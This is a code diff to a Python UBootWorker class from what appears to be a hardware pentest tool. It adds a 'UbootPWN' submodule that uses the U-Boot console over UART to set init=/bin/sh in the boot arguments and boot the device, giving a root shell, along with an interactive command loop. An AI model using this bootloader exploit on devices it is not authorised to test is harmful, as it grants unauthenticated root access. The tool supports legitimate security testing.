@@ -43,7 +43,7 @@ class UBootWorker:
         #except:
         #    pass
 
-    @submodule(name="TTLTalk",
+    @submodule(name="TTLSendCMD",
                description="Send and receive UART messages",
                in_params={
                    "message": Param("Message to send.", value_type=str, required=True)
@@ -142,8 +142,6 @@ class UBootWorker:
                },
                out_params={"Size": Param("Size of downloaded firmware", value_type=int)})
     def dumpFirmMD(self,params):
-        #TODO: дампить прошивку из output
-
         if params['Need2Open']:
             self.consoleInitializer({})
 
@@ -208,3 +206,55 @@ class UBootWorker:
         f.write(firmware_bytes)
         f.close()
         return {'Size': len(firmware_bytes)}
+
+    @submodule(name="UbootPWN",
+               description="Get bash shell console",
+               in_params={
+                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
+                   "OpenTTYConsole": Param("Open TTY to use PWN'ed console after exploitation", value_type=bool, required=False, default_value=True)
+               },
+               out_params={"version": Param("U-Boot version", value_type=str)})
+    def getShell(self,params):
+        if params['Need2Open'] and self.readyConsole==0:
+            self.consoleInitializer({})
+        envs_old = self.sendCMD({'message': 'printenv'})['result']
+
+        cmds=[
+            'setenv extra_boot_args init=/bin/sh',
+            'setenv optargs init=/bin/sh',
+            'setenv bootargs ${bootargs} single init=/bin/sh'
+        ]
+
+        for x in cmds:
+            print('Sending command:',x)
+            result = self.sendCMD({'message': x})['result']
+            if self.debug:
+                print('Result:',result)
+
+        envs_new = self.sendCMD({'message': 'printenv'})['result']
+        if self.debug:
+            print(envs_new)
+
+        print('Sending command: boot')
+        result = self.sendCMD({'message': 'boot'})['result']
+
+    @submodule(name="UbootTalk",
+               description="Send and receive UART messages",
+               in_params={
+                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
+               },
+               out_params={"result": Param("Result answer", value_type=str)})
+
+    def UbootTalk(self,params):
+        if params['Need2Open']:
+            self.consoleInitializer({})
+        cmd = ''
+        while 1:
+            cmd = input('Command: ')
+            if cmd != 'pwnexit':
+                result = self.sendCMD({'message': cmd})['result']
+                print(result)
+            else:
+                break
+        print('Goodbye!')
+
